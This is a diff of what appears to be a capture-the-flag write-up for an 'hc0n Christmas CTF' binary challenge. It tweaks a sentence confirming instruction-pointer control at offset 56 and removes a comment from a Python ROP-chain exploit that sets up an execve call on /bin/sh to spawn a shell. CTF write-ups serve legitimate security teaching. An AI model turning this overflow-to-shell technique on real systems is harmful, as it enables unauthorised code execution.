@@ -226,7 +226,7 @@ r < payload.in
 
 ![rip control confirmed](../Screenshots/hc0n%20Christmas%20CTF/23-rip-control-confirmed.png)
 
-`RIP = 0xfffffefe42424343` — exactly the bytes planted. full control at offset 56, confirmed.
+`RIP = 0xfffffefe42424343` exactly the bytes planted. full control at offset 56, confirmed.
 
 ### building the rop chain
 
@@ -267,7 +267,7 @@ def exploit(r):
 
     payload  = b"A" * 56
     payload += p64(pop_rax)
-    payload += p64(59)          # execve syscall number
+    payload += p64(59)          
     payload += p64(pop_rdi)
     payload += p64(bin_sh)
     payload += p64(pop_rsi)
